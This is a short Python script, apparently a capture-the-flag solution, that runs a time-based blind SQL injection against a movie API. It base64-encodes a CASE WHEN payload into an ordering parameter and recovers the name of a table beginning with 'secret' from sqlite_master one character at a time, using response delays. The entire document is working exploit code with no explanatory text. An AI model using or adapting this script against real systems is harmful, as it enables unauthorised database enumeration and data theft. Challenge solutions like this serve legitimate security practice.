# Script to find the table name

import requests
import base64
import json
import time

url = '<url for the chall>'

secret = list()
table_name = 'secret'
chars = 'abcdefghijklmnopqrstuvwxyz_'
sleep_time = 1

while True:
    found = False
    for i in chars:
        payload = f"(CASE WHEN (SELECT SUBSTR(name,{len(table_name)+1},1) FROM sqlite_master WHERE type='table' AND name LIKE 'secret%')='{i}' THEN id + zhopi({sleep_time}) ELSE rating END) DESC"

        encoded_payload = base64.b64encode(payload.encode()).decode('utf-8')

        data = {
            'sequence': encoded_payload
        }
        start_time = time.time()
        r = requests.post(
            url + '/api/movies',
            data=json.dumps(data),
            headers={'Content-Type': 'application/json'}
        )
        end_time = time.time()

        elapsed_time = end_time - start_time

        if elapsed_time >= sleep_time:
            table_name += i
            found = True
            print(f"Found character: {i}, updated table name: {table_name}")
            break
        else:
            print(f"\rTrying for: {i} at index: {len(table_name)}, elapsed time: {elapsed_time}",end="")

    if not found:
        print("No matching character found.")
        break

print(f"Final table name: {table_name}")
